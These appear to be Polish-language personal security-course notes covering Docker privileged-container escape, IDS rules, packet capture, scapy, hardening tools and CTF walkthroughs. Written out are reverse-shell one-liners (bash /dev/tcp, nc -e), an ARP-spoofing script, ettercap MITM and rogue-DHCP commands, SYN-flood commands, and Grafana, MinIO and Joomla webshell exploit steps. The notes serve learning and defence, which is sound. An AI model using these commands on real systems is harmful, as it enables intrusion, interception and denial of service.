Flaga --privileged daje kontenerowi pełne uprawnienia na poziomie hosta; m.in dostęp do urządzeń hosta (dyski, usb itd), połączeń sieciowych itd
ls /dev/sd{a,b}      - patrzymy że mamy dostęp do dysków hosta
Montujemy dysk host w kontenerze:
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
ls /tmp/dysk/    - mamy pełny dostęp do dysku
I możemy przeskoczyć na roota hosta:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

1. Czy mam dostęp do polecenia docker na hoście?
docker version
1. Dostęp do działających dockerów
docker ps
1. Czy na hoście w sieci uruchomiony jest nasłuchujący Docker CLI?
nmap <host> -p 2375
1. Jeżeli tak, to:
curl -s http://open.docker.socket:2375/version | jq
lub
docker -H <host>:2375 version
1. Szybka eskalacja do root w kontenerze:
docker run -it -v /:/host/ ubuntu:latest chroot
1. Jesteśmy w kontenerze który był uruchomiony z flagą --privileged jako root?
ls /dev -> jeśli widoczne są wszystkie urządzenia, to bingo:
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
cd /tmp/dysk
ls -> jesteśmy w /root na hoście :)
1. Połączenie technik: a) jesteśmy jako low-priv user na hoście, który ma dostęp do docker i b) uruchamiamy
nowy kontener z flagą --privileged -> boom :-)
docker run --privileged -it -v /:/host/ ubuntu:latest chroot
docker ps (szukamy id/ nazwy kontenera)
docker exec it <id kontenera> /bin/bash
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
cd /tmp/dysk
ls -> jesteśmy w /root na hoście :)
1. Zabezpieczenie kontenerów?
Nie używaj flagi --privileged! Jeśli potrzebny dostęp do np. urządzenia z hosta:
docker run --device=/dev/sda:/dev/xvdc --rm -it ubuntu fdisk /dev/xvdc
Uruchamianie usługi sieciowej na porcie niższym niż 1024?
docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE php:apache
Najlepiej - nie pozwalaj na logowanie jako root w kontenerze:
docker run **-u 1001** -it ubuntu:latest /bin/bash
Wyłączenie możliwości zostania rootem:
docker container run --rm -it \
--user 1001:1001 \
--security-opt no-new-privileges \
mycontainer
Docker rootless mode:
https://docs.docker.com/engine/security/rootless/
Inspekcja aktualnej instalacji Docker:
https://github.com/docker/docker-bench-security
./docker-bench-security.sh
Sprytne wykorzystanie... kontenera docker do przeskanowania innych kontenerów :)
https://github.com/quay/clair
docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"
clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image
Monitorowanie dockera i kontenerów z użyciem auditd:
https://sekurak.pl/monitoring-bezpieczenstwa-linux-integracja-auditd-ossec-czesc-i/

## Trivy

# Antivirus Software

Analiza statyczna:
Weryfikacja sygnatur pobranego pliku. Pozwala na wykrycie znanego złośliwego oprogramowania (domeny, ciągi znaków, sumy kontrolne plików, adresy IP, ...).
Nowszą odmianą tej techniki jest klasyfikacja plików oparta na uczeniu maszynowym.
I następnie weryfikacja w statycznej bazie malware.

Analiza dynamiczna:
Nowoczesne oprogramowanie antywirusowe, wraz z analizą statyczną, sprawdza zachowanie pobranego oprogramowania.
Oprogramowanie uruchamiane jest w tzw. sandbox, czyli emulatorze środowiska wykonawczego.
W nim, sprawdzane jest zachowanie aplikacji (próby odszyfrowania i odczytania haseł przeglądarki, wykonanie zrzutu LSASS itp).
Sandbox może być uruchamiany lokalnie lub w chmurze.
Okazuje się, że hostname komputera sandbox w Windows Defender to zawsze "HAL9TH"

Analiza behawioralna
Systemy EDR wykorzystują tzw. analizę behawioralną, której celem jest wykrycie podejrzanego zachowania uruchamianej aplikacji 
Przykładowo: czy aplikacja nie wywołuje komendy whoami i innych, podejrzanych, w bardzo krótkim odstępie czasu?

# DDoS Attack

* Ataki DDoS mogą być volumetryczne - atak na warstwę 4 (mierzymy w Mb/s)
Ataki DDoS mogą być aplikacyjne - atak w warstwie 7 - zajmujemy wszystkie sockety aplikacji
Na warstwie 7 jest jeszcze atak o nazwie pscket-per-second / HTTP Flood
Atak ten mierzony jest w liczbie żądań na sekundę (rps) - orawmy CPU
Aby się bronić trzeba odpowiednio skonfigurować nasz serwer http/loadbalancer
* https://github.com/shekyan/slowhttptest
* Snort / Suricata (może alertować, dropować, wiele więcej...)

# IDS (Intrusion Detection and Prevention Systems)

## Snort

http://manual-snort-org.s3-website-us-east-1.amazonaws.com/

bardzo długo i aktywnie rozwijany system klasy IDS
może też pracować w trybie IPS (Intrusion Prevention System) - w przypadku wykrycia ataku może poprosić firewall o zablokowanie atakującego
Open Source!
Często stosowany przez producentów sprzętu

Konfiguracja:
/etc/snort/snort.conf
/etc/snort/snort.debian.conf - ustawienia Debianowe
Wyłączenie dynamic detection (dynamic rules libraries)
Ustawienie RULE_PATH
Włączenie odpowiednich reguł
przykładowa reguła: /etc/snort/rules/local.rules

alert (proto) (srcIP) (srcPort) -> (dstIP) (dstPort) (…)
alert ip any any -> any any (msg: "testowa reguła"; sid: 1000001;)
alert ip any any -> any any (msg: "Testowa reguła"; content: “straszny_atak"; nocase; sid: 1000001;)

Analiza PCAP:
snort -r plik.pcap -l /root/snort_logs -c /etc/snort/snort.conf

https://litux.nl/mirror/snortids/0596006616/snortids-CHP-5-SECT-2.html

Output plugins
  - czyli w jaki sposób Snort będzie logował
  - np. logowanie do pliku tekstowego, logowanie unified (minimalizacja obciążenia samego snorta logowaniem)
Reguły
  - community rules (dostępne np. w dystrybucjach)
  - komercyjne —> https://www.proofpoint.com/
  - “oficjalne” reguły VRT

cat /etc/snort/snort.debian.conf

Reguły do snorta: Reguły szukające malware,podatności,i wiele innych można znaleźć w necie, są też płatne od samego Snort'a

Do wyboru mamy: tcp, udp, icmp, ip

#Reguła includowana w /etc/snort/snort.conf do przechwytywania ICMP
alert icmp any any -> any any (msg:"zadanie 1 - icmp 8,0"; itype:8; icode:0; sid:6666666)

#Uruchomienie
snort -K none -A console -v -c /etc/snort/snort.conf -i ens4
snort -K none -A console -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"zadanie 2 - SEKuRAK detected"; itype:8; content:"SEKuRAK"; sid:6666667)

snort -K none -A console -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"zadanie 2 - SEKuRAK detected"; itype:8; icode:0; content:"SEKuRAK"; sid:6666667)

snort -K none -A console -q -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"zadanie 3"; itype:13; icode:0; content:"sekUrak"; sid:6666668; threshold: type th│ed, 0% packet loss, time 5155ms
reshold, track by_src, count 5, seconds 60)

#Lub dodać to by dawało info o każdym takim pakiecie po wystąpieniu
detecyion_filter

snort -K none -A console -q -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"seKurak + timestamp - icmp 13,0 - 5 occurrences"; itype:13; icode:0; content:"sekUrak"; sid:1000007; treshhold:type treshold, track by_src, count 5, seconds 60;)

snort -K none -A console -q -c /etc/snort/snort.conf -i ens4

## Modsecurity

## Wazuh

# Reverse Engineering and Malware Analysis

## Cheat Engine

## Ghidra

## x64dbg

## HxD

## Cutter

## ReClass.NET

## API Monitor

## Crackmes

## IDA Pro

## Radare2

## Binary Ninja

## PEStudio

## YARA

## Cuckoo Sandbox

## ANY.RUN

## Hybrid Analysis

## VirusTotal

# Forensics and Incident Response

## Autopsy

## Volatility

## Sleuth Kit

## FTK Imager

# Password Cracking and Hashing

## John the Ripper

## Hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes

## Hydra

# Phishing

https://openphish.com/
https://www.phishtank.com/

# Network Security and Traffic Analysis

## Wireshark

## Tshark

Captures and displays verbose information about a single packet on the eth0 interface. Tshark, being the command-line version of Wireshark, is useful for detailed analysis of packets in terminal environments.
```bash
tshark -V -c 1 -i eth0
```
Filters and captures HTTP GET requests on the eth0 interface. This command is particularly useful for analyzing web traffic and identifying potentially malicious or unauthorized requests.
```bash
tshark -Y'http.request.method == "GET"' -i eth0
```
Analyzes a pcap file (capture.pcap) to summarize IP endpoints statistics, providing insights into the communication patterns, potential data exfiltration attempts, or network scans.
```bash
tshark -r capture.pcap -qz endpoints,ip
```
Follows the stream of the first TCP conversation in a pcap file in ASCII, helping to reconstruct the content of sessions or detect malicious communications within captured traffic.
```bash
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```
Extracts source IP, destination IP, and protocol information from packets in a pcap file, outputting the data in a field-based format. This is useful for quickly parsing and analyzing specific details of network traffic.
```bash
tshark -e ip.src -e ip.dst -e frame.protocols -T fields -r capture.pcap
```

## ngrep

## fragroute

## ProxyChains

Przekierowywanie ruchu sieciowego do wewnętrznej sieci - Proxychains
nano /etc/proxychains5.conf
Na końcu pliku dodać:
socks5  127.0.0.1 1080
I teraz można przesyłać ruch większości narzędzi z lokalnej VM Kali Linux, do wewnętrznej sieci LAN
ssh <user>@<serwer> -R1080
proxychains nmap 10.10.0.0/24

Konfiguracja Proxychains
1. Edycja pliku /etc/proxychains4.conf -\> na końcu pliku podmienić linię socks4 127.0.0.1 9050 na socks5 127.0.0.1 1080
2. Zestawienie dynamicznego tunelu SSH do lab.securitum.space, z poziomu VM Kali -\> ssh -D 1080 labuser1@lab.securitum.s
3. Wykonanie skanu sieciowego sieci 10.10.0.0/24 z proxychains -\> proxychains nmap -Pn -sT 10.10.0.0/24 -oX  nmap_sn_101000.xml

## SSLStrip

## iperf

## ike-scan

## ThreatCheck

## tcpreplay

## ngrem

## Network Miner

## Netcat

```text
Na maszynie atakującego:
    nc -lvnp 4444

Na maszynie ofiary:
    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

netcat (bind shell) - serwer nasłuchujący stawiamy na serwerze ofiary
netcat (reverse shell) - serwer nasłuchujący stawiamy na serwerze atakującego

nc reverse shell
```bash
`nc -e /bin/sh <attacker_ip> 1234`: Establishes a reverse shell connection from the target to the attacker's machine (`<attacker_ip>`) on port `1234`, executing `/bin/sh` for shell access. This command leverages `netcat (nc)` for backdoor access into the target system. `nc -lvp 1234`: Listens on port `1234` for incoming connections, typically used by the attacker to receive the reverse shell from the target. The `l` option listens for an incoming connection, `v` is for verbose output, and `p` specifies the port.
```
nc simple chat server
```bash
`nc -lvp 1234`: Sets up a listener on port `1234` that could act as a simple chat server. This demonstrates the versatility of `netcat` for creating quick and temporary network services. `nc -v <ipaddress> 1234`: Connects to the chat server hosted on `<ipaddress>` at port `1234`. This showcases `netcat`'s ability to be used for straightforward client-server communication setups.
```

## Snorby

## tcpxtract

## hping3

Sends SYN packets to port 80 of 172.18.0.11 at high speed (-flood), simulating a SYN flood attack. The S flag sets the SYN flag, V enables verbose mode, and p 80 specifies the target port. This command is used for testing the resilience of the target against SYN flood attacks.
```bash
hping3 -S --flood -V -p 80 172.18.0.11
```
Performs a traceroute to example.com using ICMP packets (1), with verbose output (V). This is used to map the route packets take to the target, which can help identify firewalls, routers, and other network devices.
```bash
hping3 --traceroute -V -1 example.com
```

Program umożliwiający generowanie różnego rodzaju pakiety

można zobaczyć, że hping3 spoofuje adresy źródłowe, by uodpornić się na zabezpieczenia i wysyła za każdym pakiet z innego adresu IP

Generowanie pakietów udp
hping3 --udp -p 19 10.0.0.11
hping3 -S -V -p 80 -d 1000 -c 5 --rand-source ships.securitum.space
w każdym urządzeniu sieciowym jest coś takiego jak MTU - określenie jak jest maksymalna wielkość pakietu
ale można pofragmentować taki duży pakiet na mniejsze ---> (-f)
hping3 -S -V -p 80 -d 1000 -c 5 --rand-source ships.securitum.space -f

## tcpdump

Captures ICMP packets across all network interfaces. This command is useful for monitoring and analyzing ICMP traffic for suspicious activities like ping sweeps or network mapping attempts.
```bash
tcpdump -i any icmp
```
Captures network traffic on the eth0 interface and writes it to a file named capture.pcap. This is a fundamental technique for capturing and analyzing network packets to detect anomalies or malicious activities.
```bash
tcpdump -w capture.pcap -i eth0
```
Reads packets from a pcap file (capture_file.pcap), allowing for offline analysis of captured network traffic. This is useful for deep dives into specific network events or incidents.
```bash
tcpdump -r capture_file.pcap
```
Captures the first 100 packets on the eth0 interface, limiting the capture to a manageable number of packets for quick analysis or demonstration purposes.
```bash
tcpdump -i eth0 -c 100
```
More tcpdump examples
```bash
tcpdump -i ens4 -n -A -vv
tcpdump -i ens4 host 10.0.0.11 and port 520
tcpdump -i ens4 host 10.0.0.11 and "port 520 or port 22"
tcpdump -i ens4 tcp and host 10.0.0.11
tcpdump -i ens4 tcp and host 10.0.0.11 -w pcap.pcap
tcpdump -i ens4 tcp and host 10.0.0.11 -w pcap.pcap -c 10
```

tcpdump -n -i ens1 -w zrzut.pcap -c 10 tcp and port 80
Później można wyświetlić w scapy lub wireshark

tcpdump -n (wyłączenie odpytywania DNS) - bez tego parametru często wygląda jakby tcpdump się “zawiesił”
tcpdump -i <interfejs> nasłuchiwanie na konkretnym interfejsie sieciowym większa dokładność, mniej pomyłek
tcpdump -c N (odczytanie N pakietów)
tcpdump -w plik.pcap (zapis przechwyconych pakietów do pliku plik.pcap)
tcpdump -r plik.pcap (odczyt i wyświetlenie pakietów z pliku plik.pcap)
tcpdump -vv (prezentacja przechwyconych pakietów w bardziej szczegółowej formie)
tcpdump -X (wyświetlenie szczegółów pakietów również w formie zrzutu w HEX)
tcpdump -XX (jeszcze więcej szczegółów…)
tcpdump -e (wyświetlenie również adresacji fizycznej - adresy MAC)

Filtry BPF:
host 192.168.1.1
dst host 192.168.1.1
port 80
arp
tcp
icmp
ip

Filtry można łączyć:
host 192.168.1.1 and dst port 25
Filtry BPF przyjmują też warunki logiczne:
tcp and (port 80 or port 25)

## Ettercap

Ettercap to “kombajn” do wykonywania ataków klasy MiTM (man-in-the-middle). Istnieje jego ulepszona wersja - bettercap

ARP Poison Routing (APR) - realizacja:
ARP Spoofing: ettercap -Tq -M arp:remote /192.168.0.113,147,156/
Sniffing: tcpdump -i eth1 -w /var/www/dump_voip.pcap
Odsłuch: Wireshark

budujemy pakiet od nowa (bazując na tym co
przechwyciliśmy) lub budujemy pakiet na bazie przechwyconego

arp
ettercap -i ens4 -Tq -M arp:remote /10.0.0.11// /10.0.0.12//

rouge DHCP
ettercap -Tq -M dhcp:10.20.0.30-40/255.255.255.0/10.20.0.18
uruchamia serwer DHCP z pula 10.20.0.30-40, maska /24 i DNSem 10.20.0.18
aby uruchomic fake DNS w ettercap wciskamy P i wpisujemy dns_spoof.

## Bettercap

## Scapy

https://securityonionsolutions.com/software

https://www.google.com/search?q=scapy+cheat+sheet&rlz=1C1GCEU_plPL1078PL1078&oq=scapy+cheat+sheet&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTILCAEQABgNGBMYgAQyCwgCEAAYDRgTGIAEMgoIAxAAGBMYFhgeMgoIBBAAGBMYFhgeMgwIBRAAGAoYExgWGB4yDAgGEAAYBRgNGBMYHjIMCAcQABgIGA0YExgeMgwICBAAGAgYDRgTGB4yDAgJEAAYCBgNGBMYHtIBBzY0OWowajeoAgCwAgA&sourceid=chrome&ie=UTF-8

https://sekurak.pl/generator-pakietow-scapy/
https://sekurak.pl/generator-pakietow-scapy-czesc-2/

Scapy to generator oraz sniffer pakietów. Kompatybilny z libpcap.
Generowanie pakietów
Analiza komunikacji sieciowej
porównywalne z tekstowym wiresharkiem
(Tshark)
możliwość zmiany komunikacji & ponownego
wysłania
bogate skryptowanie (python)
Dynamiczna reakcja na określone zdarzenia w sieci

ls() - obsługiwane pakiety/protokoły
ls(nazwa_pakietu) - szczegółowe informacje o pakiecie
ls(ICMP) - np. ICMP
lsc() - funkcje dostępne w Scapy
help(funkcja)
help(sniff)

Generowanie pakietu
pakiet = IP(dst='192.168.0.1')/ICMP()
Wysłanie pakietu
pakiet.show()
Wyświetlenie pakietu
odpowiedz = sr1(pakiet)
Wyświetlenie odpowiedzi
odpowiedz.show()

pakiety = IP(dst='10.0.1.254')/ICMP(type=(0,20))
odp, nodp = sr(pakiety, timeout=2)
odp.show()
odp[1][1].show()

pakiety = IP(dst='10.0.1.254')/TCP(dport=(20,100))
odp, nodp = sr(pakiety)
for p in odp:
... if p[1].sprintf('%TCP.flags%')=='SA':
... print(p[0].dport)

Przygotujmy skrypt, który wykonuje proste statystyki analizując plik .pcap. Pokazuje ile było wysłanych pakietów TCP na różne adresy IP

https://scapy.readthedocs.io/en/latest/usage.html#tcp-port-scanning

res, unans = sr(IP(dst="10.0.0.11")/TCP(flags="S", dport=(1,100)), timeout=10)
for snd, rcv in res:
    if rcv[TCP].flags == "SA":
        print(f"Otwarty port: {snd[TCP].dport}")

def process_arp(packet):
    if packet.haslayer(ARP):
        print(f"{packet[ARP].psrc} pyta gdzie jest {packet[ARP].pdst}")
        packet.show()
sniff(filter="arp", prn=process_arp, store=0, iface="ens4")

target_ip = "10.0.0.11"
spoof_ip = "10.0.0.13"
moj_mac = "fa:16:3e:60:9c:7d"
target_mac = getmacbyip(target_ip)
if target_mac is None:
    print(f"Nima {target_ip}.")
else:
    while True:
        arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=moj_mac)
        send(arp_response, iface="ens4")
        print(f"FAKE!: {spoof_ip} jest tu --> {moj_mac}, wysłane do {target_ip} ({target_mac})")
        time.sleep(0.1)

scapy
pakiet = rdpcap('www_request.pcap')
hexdump(pakiet[3])
pakiet[3].show()
pakiet[3].pdfdump(/var/www/1.pdf,layer_shift=1)

pakiety_arp = sniff(filter="arp",count=1,iface="ens4")
pakiety_arp.show()
pakiety_arp[0].show()
pakiety_arp[0].op = 'is-at'
pakiety_arp[0].src = '<moj-mac>'
pakiety_arp[0].hwsrc = '<moj-mac>'
pakiety_arp[0].dst = '<adres-mac-ofiary>'
pakiety_arp[0].hwdst = '<adres-mac-ofiary>'
pakiety_arp[0].pdst = '<adres-ip-ofiary>'
Jak poznać adres MAC ofiary? W Scapy możemy uzyc funkcji getmacbyip(), czyli:
getmacbyip('10.50.0.17')
pakiety.dst = getmacbyip('10.50.0.17')
pakiety_arp[0].psrc = '10.0.0.12'
sendp(pakiety_arp[0],iface="ens4")
tcpdump -i ens4 -n icmp    - i powinny byc tam pingi z 10.0.0.11 na 10.0.0.12

# Development and Productivity Tools

## Visual Studio Code

## Tmux

Terminal multiplexer that allows multiple terminal sessions to be accessed simultaneously within a single window. Ethical hackers use it to manage multiple command-line tasks efficiently during testing or when exploiting vulnerabilities.
```bash
tmux
```
Creates a new tmux session named "bob". This allows an ethical hacker to organize their work in named sessions, making it easier to manage complex tasks.
```bash
tmux new -s bob
```
Attaches to the last tmux session. Useful for returning to a previously detached session, ensuring continuity in the ethical hacking process.
```bash
tmux a
```
TMUX - Prefix ustawiony został na C-a (CTRL+a), więc komendy są bardzo zbliżone do tego, co znasz ze screen
```bash
CTRL+a c -- otwarcie nowego taba
CTRL+a % -- podzielenie taba na pół w pionie
CTRL+a " -- podzielenie taba na pół w poziomie
CTRL+a <strzałka> -- przechodzenie między podziałami
CTRL+a n -- przejście do następnego taba
CTRL+a p -- przejście do poprzedniego taba
CTRL+a numer -- przejście do konkretnego taba
CTRL+a d -- zminimalizowanie sesji
CTRL+a u -- wyrzucenie podglądacza (w tym wypadku prowadzącego :male_vampire:)
CTRL+a [ -- copy mode - możliwość przewijania ekranu (wychodzimy za pomocą q)
CTRL+a z -- zoom (wracamy tak samo)
```

## Arduino IDE

## DB Browser (SQLite)

## draw.io

## MobaXterm

## WinMerge

## 7zip

# Hardware Tools

https://pwnagotchi.ai/
https://www.mobile-hacker.com/2024/03/26/blueducky-automates-exploitation-of-bluetooth-pairing-vulnerability-that-leads-to-0-click-code-execution/

# Cyber News Hub

https://attack.mitre.org/
https://owasp.org/www-project-top-ten/
https://www.cisecurity.org/cis-benchmarks
https://www.cvedetails.com/
https://news.ycombinator.com/

# Sample penetration tests

https://www.securitum.com/public-reports.html

## 1
  * nmap 178.79.162.77 -Pn
    * see in output: 8000/tcp open http-alt
  * ffuf -w common.txt -u http://178.79.162.77:8000/FUZZ
  * Adres http://178.79.162.77:8000/old_site
  * Plik http://178.79.162.77:8000/old_site/file.txt
## 2
  * nmap -Pn -p- 10.10.10.50
    * port 3000/TCP jest otwarty. Baner wskazuje, że to serwer HTTP
  * Należy otworzyć w przeglądarce ten adres. W tym celu, należy zestawić sockproxy z naszego hosta, z serwerem CTF (ssh root@ctf.securitum.space -D9999), i odpowiednio skonfigurować Burpa (ustawienia burpa -> SOCKS Proxy)
  * Identyfikacja podatnej usługi - Grafana CVE-2021-43798. Usługa ta jest podatna na błąd typu path traversal, który pozwala na odczytanie dowolnego pliku. Aby to zrobić, w Burp Suite, należy przesłać żądanie:
    * GET /public/plugins/alertlist/../../../../../../../../../../../../..//home/grafana/challenge/flag.txt HTTP/1.1
## 3
  * nmap -Pn -p- 10.10.10.99
    * port 9000/TCP jest otwarty. Baner wskazuje, że to serwer HTTP.
  * Należy otworzyć w przeglądarce ten adres. W tym celu, należy zestawić sockproxy z naszego hosta, z serwerem CTF (ssh root@178.79.162.77 -D9999), i odpowiednio skonfigurować Burpa (ustawienia burpa -> SOCKS Proxy)
  * Identyfikacja podatnej usługi - MinIO CVE-2023-28432 - Błąd ten pozwala na wyświetlenie wszystkich zmiennych środowiskowych aplikacji, w tym danych logowania do panelu admina.  Aby wykorzystać błąd, należy w Burp Suite przesłać zapytanie:
    * POST /minio/bootstrap/v1/verify HTTP/1.1
## 4
  * nmap -Pn -p- 10.10.10.22
    * port 80/TCP jest otwarty. Baner wskazuje, że to serwer HTTP.
  * Należy otworzyć w przeglądarce ten adres. W tym celu, należy zestawić sockproxy z naszego hosta, z serwerem CTF (ssh root@178.79.162.77 -D9999), i odpowiednio skonfigurować Burpa (ustawienia burpa -> SOCKS Proxy)
  * Identyfikacja podatnej usługi - Joomla
  * Należy otworzyć adres w przeglądarce. Możliwe jest zalogowanie się do panelu administratora (http://10.10.10.22/administrator) podając domyślne dane logowania- admin:admin.
  * Modyfikacja treści strony internetowej - zdalne wykonanie kodu. Aby wykonać komendę na systemie należy:
    1. Zedytować domyślną stronę Joomla - Cassiopeia (System -> Site Templates -> Cassiopeia Details and Files-> wybrać /templates/cassiopeia/index.php)(http://10.10.10.22/administrator/index.php?option=com_templates&view=template&id=223&file=L2luZGV4LnBocA%3D%3D&isMedia=0)
    2. Dodać na samym końcu kodu template złośliwy kod PHP (webshell)
    3. Przesłać zapytanie GET do głównej strony aplikacji, zawierające parametr "cmd" z komendą do wykonania.
  * Flaga znajduje się w pliku /tmp/challenge/flag.txt:
    * GET /?cmd=cat%20/tmp/challenge/flag.txt HTTP/1.1
## 5
  * nmap -Pn -p- 10.10.10.18
    * port 8080/TCP jest otwarty. Baner wskazuje, że to serwer HTTP.
  * w przeglądarce po otwarciu adresu brak konkretnej informacji - komunikat błędu wskazuje jednak, że to usługa Java (Whitelabel Error page specyficzne dla Spring Boot).
  * Identyfikacja podatnej usługi - Log4j.  Usługa ta została opisana i przetestowana w czasie szkolenia. Kroki wykorzystania podatności są identyczne (opisane w notatkach). Problem z exploitacją związany jest z brakiem prostego dostęp do środowiska Java- konta, na których uczestnicy CTF są zalogowani posiadają niskie uprawnienia w systemie. Java konieczna jest do uruchomienia złośliwego serwera JNDI, zwracającego odpowiednio sformatowaną odpowiedź LDAP.
## 6
  * nmap -Pn -p- 10.10.10.49
    * port 6379/TCP jest otwarty. Baner wskazuje, że to usługa Redis
  * Identyfikacja podatnej usługi - Redis CVE-2022-0543. Po zalogowaniu do serwera Redis (redis-cli -h 10.10.10.49 -p 6379 lub nc -nv 10.10.10.49 6379), możliwe jest wykonywanie komend Redis bez uwierzytelnienia. Po enumeracji wersji Redisa komendą info, możliwe jest zauważenie, że Redis uruchomiony jest na środowisku Ubuntu. Dokładna exploitacja podatności opisywana była podczas szkolenia. Technika wraz z payloadem znajduje się w notatniku. Flaga znajduje się w pliku /root/challenge/flag.txt.
## 7
  * nmap -Pn -p- 10.10.10.6
  * nmap -Pn 10.10.10.6 -O
    * Skan wskazuje, że host to Ubuntu. Otwarty port- 22/TCP (ssh).
  * W zadaniu "99" (web- MinIO) dane logowania do panelu webowego to "ubuntulab:ubuntuadmin". Należy wykorzystać te dane do zalogowania się via SSH do maszyny. Błąd polega na wykorzystaniu tych samych danych logowania do wielu usług w lokalnej sieci LAN. Stanowi przykład złej praktyki często spotykanej w realnych środowiskach.
## 8
  * nmap -Pn -p- 10.10.10.57
  * nmap -Pn 10.10.10.57 -O
    * Skan wskazuje, że host to Ubuntu. Otwarty port- 22/TCP (ssh).
  * zalogowaanie się po ssh danymi uzyskanymi w innym zadaniu
  * Użytkownik root ma dostęp do narzędzia mount:
    * mount
      * overlay on / type overlay
        (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/CVHB7TUUSPNALD3CVQIAOVSBJI:/var/lib/docker/overlay2/l/VVTCMNIXHJO3PSSVXJFZXW2HR2:/var/lib/docker/overlay2/l/IEK3BMYDLROA4Y3A3FNT6PVRG
        E:/var/lib/docker/overlay2/l/E2UI4IBA6PPXXU4TWISEL7II27,upper
  * W przeciwieństwie do pozostałych maszyn w CTF, po uzyskaniu roota na maszynie .57, możliwe jest też m.in wyświetlenie zawartości folderu /dev:
    * ls /dev
      * [ ...] sda snd tty1 tty15 tty20 tty26 tty31 tty37 tty42 tty48 tty53 tty59 tty7 ttyS3 vcs2 vcsa1 vcsu vcsu6 watchdog
  * co potwierdza, że ten docker został uruchomiony z flagą --privileged
  * Z wykorzystaniem techniki ze szkolenia, możliwe jest podmontowanie dysku głównego hosta do dowolnego folderu:
    * mkdir /tmp/dysk
    * mount /dev/sda /tmp/dysk
    * cd /tmp/dysk/

# TODO Learn/Read

```bash
systemd-analyze
w
getsebool -a
aureport
ausearch --message USER_LOGIN --success no --interpret
cat /proc/mdstat
systemctl --type=service
systemctl is-active [...]
systemctl is-enabled [...]
cat /etc/default/grub
ulimit -a
```

* Narzędzie `OSCAP`:
```bash
yum install -y httpd openscap-scanner scap-security-guide
oscap info /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
oscap info --fetch-remote-resources --profile xccdf_org.ssgproject.content_profile_pci-dss /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
oscap xccdf eval --fetch-remote-resources --profile xccdf_org.ssgproject.content_profile_pci-dss --results ./scan-xccdf-results.xml /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
date=$(date +"%Y%m%d")
oscap xccdf generate report ./scan-xccdf-results.xml > ./"$date"_oscap_report.html
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_pci-dss --remediate --fetch-remote-resources --results ./scan-xccdf-results.xml --rule xccdf_org.ssgproject.content_rule_package_libreswan_installed /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_pci-dss --remediate --fetch-remote-resources --results ./scan-xccdf-results.xml --rule xccdf_org.ssgproject.content_rule_package_libreswan_installed /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
```

* Lynis:
```bash
wget https://downloads.cisofy.com/lynis/lynis-3.1.1.tar.gz
tar xvf lynis-3.1.1.tar.gz
sudo chown -R 0:0 lynis
date=$(date +"%Y%m%d")
cd lynis
sudo ./lynis audit system | ansi2html -la > ./../output/"$date"_lynis_report.html
cd ..
rm -rf ./lynis*
```

* Trivy:
```bash
#!/bin/bash

rm -rf ./output/*
rm -rf ./cache/*

date=$(date +"%Y%m%d")

# Get all unique image names (repositories) and their tags
images=$(docker images --format "{{.Repository}}:{{.Tag}}" | sort | uniq)

for image in $images
do
  # Extract the image name and tag separately
  image_name="${image%:*}"
  #echo "$image_name"
  image_tag="${image##*:}"
  #echo "$image_tag"

  # Extract the last part of the image name
  last_name="${image_name##*/}"

  # Check if the last name is "trivy" and skip it if true
  if [ "$last_name" == "trivy" ]; then
    continue
  fi

 # need to download/create html.tpl
 docker run --name trivy --rm --network host -v ./html.tpl:/root/html.tpl -v ./output:/root/output -v ./cache:/root/.cache/ -v /var/run/docker.sock:/var/run/docker.sock docker.io/aquasec/trivy:latest image --format template --template "@/root/html.tpl" -o /root/output/"$date"_trivy_report_"$last_name".html "$image_name":"$image_tag"
done

docker image rm aquasec/trivy:latest
```

* https://www.rtl-sdr.com/
* https://airspy.com/download/
* https://bruce.computer/
* https://www.openvas.org/
* https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm
* https://sekurak.pl/wprowadzenie-do-sysinternals-suite/
* https://github.com/pentestfunctions/BlueDucky
* https://learn.microsoft.com/pl-pl/sysinternals/downloads/
* https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/?fbclid=IwAR1IHvuBfTlSn7tX2xUmJ2ghnrB8536oTbuUThp_2qwZJuhXleD2SMJboks
* https://github.com/skylot/jadx
* https://www.thewindowsclub.com/enable-or-disable-run-command-winr-box-in-windows-10
* https://any.run/
* https://www.splunk.com/en_us/blog/security/powershell-web-access-your-network-s-backdoor-in-plain-sight.html
* https://lolbas-project.github.io/
* https://book.hacktricks.wiki/en/index.html
* https://gamehacking.gg/
* https://www.forensicosint.com/
* https://hijacklibs.net/
* https://github.com/ohyicong/decrypt-chrome-passwords
* https://cyscan.io/
* Linux ssh konfiguracja:
X11Forwarding no
AllowTcpForwarding no
* MAC AA:BB:CC:DD:EE:FF: pierwsze 3 mówią o producencie; kolejne to identyfikator urządzenia
curl --head --location "https://ntck.co/itprotv"
curl -IsL http://networkchuck.com/ | findstr ^Location
curl checkip.amazonaws.com
curl qrenco.de/https://networkchuck.coffee
* ssh root@145.239.135.237 -i $HOME/.ssh/securitum-szkolenie -D 8845
* W google ---> site:gov.pl "mysql warning:"
              site:gov.pl "Index of"
* https://github.com/RUB-NDS/PRET      - narzędzie które czasem pozwala wyjść z shella drukarki do shella linuxa w drukarce
* curl wttr.in/location
* https://roadmap.sh/
